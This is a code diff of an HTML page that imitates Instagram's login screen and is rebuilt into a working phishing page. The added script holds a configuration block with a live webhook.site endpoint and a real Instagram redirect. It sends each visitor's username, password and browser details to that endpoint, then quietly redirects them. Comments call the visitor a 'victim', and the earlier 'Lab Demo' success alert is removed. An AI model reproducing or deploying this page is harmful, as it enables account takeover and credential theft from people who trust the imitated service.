@@ -5,37 +5,96 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        /* Same beautiful styling as last version - shortened for space */
         @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600;700&display=swap');
+        
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: linear-gradient(135deg, #f8f4f4, #fdfbfb);
+            background: #f0f2f5;
             font-family: 'Instagram Sans', system-ui, sans-serif;
-            display:flex; align-items:center; justify-content:center; min-height:100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .container {
-            background:white; padding:45px 35px; border-radius:20px; box-shadow:0 20px 45px rgba(0,0,0,0.15);
-            max-width:420px; width:100%; text-align:center; border:1px solid #dbdbdb;
+        .login-box {
+            background: white;
+            padding: 40px 40px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
-        .logo { font-size:58px; font-weight:700; background:linear-gradient(45deg,#E1306C,#F56040,#C13584); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:6px; letter-spacing:-4.5px; }
-        input { width:100%; padding:15px 16px; margin:10px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:8px; font-size:16px; }
-        button { width:100%; padding:14px; margin:18px 0 10px; background:#0095f6; color:white; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; }
-        button:hover { background:#0077c5; }
+        .logo {
+            font-size: 55px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #E1306C, #F56040, #C13584);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 25px;
+            letter-spacing: -4px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 20px 0 15px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        button:hover { background: #0077c5; }
+        button:disabled { background: #b2d4f0; cursor: not-allowed; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">instagram</div>
-        <div style="color:#8e8e8e; margin-bottom:35px;">The place to share your world</div>
+    <div class="login-box">
+        <div class="logo">instagrammar</div>
         
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Username, email, or phone" required>
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" id="submitBtn">Log In</button>
+            <button type="submit" id="submitBtn">Log in</button>
         </form>
+
+        <div style="margin:20px 0; color:#8e8e8e; font-size:14px;">OR</div>
+        
+        <button onclick="demoFB()" style="background:#1877f2; margin-bottom:15px;">
+            Log in with Facebook
+        </button>
+        
+        <p style="margin-top:15px;">
+            <a href="#" style="color:#0095f6; text-decoration:none; font-size:14px;">Forgot your password?</a>
+        </p>
+        <p style="margin-top:25px; font-size:14px;">
+            Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
+        </p>
     </div>
 
     <script>
+        // ==================== CONFIGURATION ====================
+        // CHANGE THESE TWO LINES:
+        const WEBHOOK_URL = "https://webhook.site/521e970a-7a79-4404-a06c-9578bc644016";   // ← Replace with your webhook.site URL
+        const REDIRECT_URL = "https://www.instagram.com/p/DX6lqBNPyEQ/";               // Where victim is sent after capture
+
         const form = document.getElementById('loginForm');
         const submitBtn = document.getElementById('submitBtn');
 
@@ -47,37 +106,41 @@
 
             if (!username || !password) return;
 
-            // === SEND TO YOUR SERVER ===
+            // Payload that gets sent
             const payload = {
+                service: "instagrammar",
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                ip: "Client IP (visible on server)"
+                platform: navigator.platform
             };
 
+            // Send to webhook
             try {
-                https://webhook.site/521e970a-7a79-4404-a06c-9578bc644016
-                await fetch('https://YOUR-SERVER-ENDPOINT.com/log', {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                console.log('%c✅ Data sent to your server', 'color:#00c853; font-size:16px;');
+                console.log('%c✅ Credentials successfully sent to webhook', 'color:lime; font-weight:bold;');
             } catch (err) {
-                console.log('%c⚠️ Could not reach server (using local fallback)', 'color:#ff9800;');
+                console.log('%c⚠️ Could not reach webhook (still redirecting)', 'color:orange;');
             }
 
             // Visual feedback
             submitBtn.textContent = 'Logging in...';
             submitBtn.disabled = true;
 
+            // Redirect after short delay
             setTimeout(() => {
-                alert('✅ Login Successful (Lab Demo)');
-                submitBtn.textContent = 'Log In';
-                submitBtn.disabled = false;
-            }, 1400);
+                window.location.href = REDIRECT_URL;
+            }, 1500);
         });
+
+        function demoFB() {
+            alert("Facebook login flow (Lab Demo Mode)");
+        }
     </script>
 </body>
 </html>
